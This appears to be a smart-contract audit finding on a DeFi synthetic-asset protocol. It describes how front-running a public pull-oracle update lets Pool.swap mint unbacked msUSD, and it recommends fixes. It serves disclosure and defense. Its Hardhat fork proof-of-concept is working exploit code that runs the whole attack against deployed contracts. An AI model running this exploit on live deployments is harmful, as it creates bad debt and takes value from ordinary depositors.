### Title

Stale oracle update front-running lets `Pool.swap` mint unbacked synthetic assets - (`contracts/Pool.sol`)

### Summary

`Pool.swap()` burns the input synthetic asset and mints the output solely according to the current `IMasterOracle.quote()` result, without requiring the oracle to be refreshed first or preserving the debt-token denomination of the original position. [1](#0-0)  On deployments using a publicly updateable pull oracle, an unprivileged user can atomically execute the swap while the accepted oracle price is stale and then submit the pending public price update, analogous to ordering the update after the vulnerable operation. [2](#0-1) 

### Finding Description

An attacker first deposits collateral through `DepositToken.deposit()` and issues `msETH` through `DebtToken.issue()`. [3](#0-2)  `issue()` computes the available issuance limit from `Pool.debtPositionOf()`, which values collateral through `quoteTokenToUsd()` and values existing debt through the same oracle. [4](#0-3) 

If a pending public update lowers `msETH` from 2,000 USD to 1,800 USD while the stale 2,000 USD quote is still accepted, one `msETH` swapped through `Pool.swap(msETH, msUSD, 1 ether)` mints approximately 2,000 `msUSD`. [5](#0-4)  After the update, one `msETH` is worth only 1,800 USD, so swapping 1,800 `msUSD` back produces approximately one `msETH`, which repays the original debt. [6](#0-5) 

The remaining roughly 200 `msUSD` has no corresponding debt because `Pool.swap()` mutates synthetic-token supply but never transfers or recreates debt in the output synthetic token's `DebtToken`. [7](#0-6)  Once the debt reaches zero, `DepositToken.unlockedBalanceOf()` returns the full collateral balance and the attacker can withdraw the original collateral. [8](#0-7) 

### Impact Explanation

Each successful update front-run leaves residual synthetic supply with no corresponding borrower debt. [7](#0-6)  The attacker exits with the original collateral plus the residual synthetic asset, while the pool remains responsible for honoring that unbacked synthetic supply. [8](#0-7)  Repeated exploitation around volatile oracle updates creates bad debt and can make the aggregate synthetic liabilities exceed the collateral backing available to ordinary depositors. [9](#0-8) 

### Likelihood Explanation

The vulnerable entry point is public, requires only an attacker-controlled account and collateral, and is guarded only by shutdown, reentrancy, token-existence, swap-active, and input-balance checks. [10](#0-9)  The deployment tests demonstrate that pull-oracle updates are public protocol interactions and that `Operator.execute()` can atomically compose an oracle update with a Metronome call. [11](#0-10)  The exploit needs a favorable price update whose previous value remains within the oracle's accepted freshness window; this is a normal volatile-market condition rather than privileged access or corrupted governance configuration. [12](#0-11) 

### Recommendation

Do not let `Pool.swap()` consume a pull-oracle value that can become stale relative to an already available update. [13](#0-12)  Require the oracle implementation to expose and enforce a bounded publish-time/freshness check, reject updates that were publicly available before the swap, or atomically refresh all involved feeds before calculating `amountOut`. [12](#0-11)  Additionally, add a protocol-level bound on quote movement or a swap-time solvency invariant so a stale quote cannot expand synthetic supply without corresponding debt. [5](#0-4) 

### Proof of Concept

The following Hardhat fork test exercises the production path on a network whose `MasterOracle` is backed by a publicly updateable pull provider. The signed `priceUpdateData` must be a pending update with a lower `msETH` price than the currently accepted cached value.

```ts
// test/foundry-or-hardhat-fork/PoolSwapStaleOraclePoC.ts
import {expect} from 'chai'
import {ethers} from 'hardhat'
import {parseEther} from 'ethers/lib/utils'

it('mints unbacked msUSD by front-running an msETH oracle update', async () => {
  const [attacker] = await ethers.getSigners()

  // Deployed production contracts on the selected fork.
  const pool = await ethers.getContractAt('Pool', POOL)
  const operator = await ethers.getContractAt('Operator', OPERATOR)
  const masterOracle = await ethers.getContractAt(
    [
      'function quote(address,address,uint256) view returns (uint256)',
      'function getPriceInUsd(address) view returns (uint256)',
    ],
    MASTER_ORACLE
  )
  const weth = await ethers.getContractAt('IERC20', WETH)
  const msdWeth = await ethers.getContractAt('DepositToken', MSD_WETH)
  const msEthDebt = await ethers.getContractAt('DebtToken', MSETH_DEBT)
  const msEth = await ethers.getContractAt('SyntheticToken', MSETH)
  const msUsd = await ethers.getContractAt('SyntheticToken', MSUSD)

  // Fund the fork account and open a normal collateralized msETH position.
  const collateralIn = parseEther('10')
  await setTokenBalance(WETH, attacker.address, collateralIn)
  await weth.approve(msdWeth.address, collateralIn)
  await msdWeth.deposit(collateralIn, attacker.address)

  const amountIn = parseEther('1')
  await msEthDebt.issue(amountIn, attacker.address)

  const staleMsEthUsd = await masterOracle.getPriceInUsd(msEth.address)
  const expectedFairOut = await pool.quoteSwapOut(msEth.address, msUsd.address, amountIn)

  // `priceUpdateData` is a valid signed pull-oracle update, e.g. one lowering
  // msETH from 2,000 USD to 1,800 USD, obtained from the network's provider.
  const updateTx = await pullPriceProvider.populateTransaction.updatePrice(priceUpdateData)

  // Atomically use the stale quote, then publish the already available update.
  await operator.execute([
    {
      target: pool.address,
      value: 0,
      callData: pool.interface.encodeFunctionData('swap', [
        msEth.address,
        msUsd.address,
        amountIn,
      ]),
    },
    {
      target: pullPriceProvider.address,
      value: 0,
      callData: updateTx.data,
    },
  ])

  const freshMsEthUsd = await masterOracle.getPriceInUsd(msEth.address)
  expect(freshMsEthUsd).lt(staleMsEthUsd)

  // Reacquire the original msETH debt at the fresh lower valuation.
  const repaySwap = await pool.quoteSwapIn(
    msUsd.address,
    msEth.address,
    amountIn
  )
  await pool.swap(msUsd.address, msEth.address, repaySwap._amountIn)
  await msEthDebt.repayAll(attacker.address)

  const residualMsUsd = await msUsd.balanceOf(attacker.address)
  expect(residualMsUsd).eq(expectedFairOut._amountOut.sub(repaySwap._amountIn))

  // The original collateral is fully unlocked once the debt is repaid.
  const msdBalance = await msdWeth.balanceOf(attacker.address)
  await msdWeth.withdraw(msdBalance, attacker.address)

  // `residualMsUsd` is synthetic supply without corresponding msUSD debt.
  expect(await msUsd.balanceOf(attacker.address)).eq(residualMsUsd)
})
```

The key accounting observation is also executable as an assertion: the swap reduces `msETH.totalSupply()` while leaving `msETHDebt` unchanged and increases `msUSD.totalSupply()` without increasing an `msUSD` debt token. [7](#0-6)
